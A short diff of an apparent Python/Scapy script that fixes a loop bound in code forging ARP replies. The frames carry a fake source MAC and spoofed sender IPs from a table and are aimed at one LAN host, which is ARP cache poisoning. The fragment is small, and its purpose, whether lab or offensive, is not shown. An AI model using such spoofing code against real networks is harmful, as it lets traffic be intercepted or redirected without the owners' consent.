@@ -46,7 +46,7 @@ except ValueError:
     print("Please enter a valid number.")
     sys.exit(1)
 
-for i in range(min(n, len(targets))):
+for i in range(min(n, len(table))):
     t = table[i]
     E = Ether(dst = '00:1D:9C:C8:BC:70', src = 'AA:AA:AA:AA:AA:AA')  
     A = ARP(op = 2, hwsrc = 'AA:AA:AA:AA:AA:AA', psrc = t["ip"], hwdst = '00:1D:9C:C8:BC:70', pdst = '192.168.1.70')  
